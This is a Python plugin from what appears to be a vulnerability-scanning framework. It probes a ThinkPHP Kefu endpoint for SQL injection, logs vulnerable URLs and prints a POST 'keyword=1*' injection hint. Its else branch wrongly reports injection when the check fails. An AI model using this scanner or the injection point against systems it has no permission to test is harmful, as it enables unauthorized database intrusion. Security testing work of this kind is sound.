#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile


urllib3.disable_warnings()
class ThinkKeFuScan:
    def run(self, urls):
        try:
            url = urls + '/index.php/ApiAdminKefu/index?aid=3&uid=3'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
            response.encoding = response.apparent_encoding
            if "status" in response.text:
                OutPrintInfoSuc("ThinkPHP", f'目标存在SQL注入: {url}')
                if not self.batch:
                    OutPrintInfoSuc("ThinkPHP", f'通过POST请求，DARA:keyword=1*')
                else:
                    OutPutFile("thinkphp_kefu_sql.txt", f'目标存在SQL注入漏洞: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("ThinkPHP", '目标存在SQL注入')

        except Exception:
            if not self.batch:
                OutPrintInfo("ThinkPHP", '目标请求出错')

    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ThinkPHP", '开始检测SQL注入漏洞...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("ThinkPHP", 'SQL注入漏洞检测结束')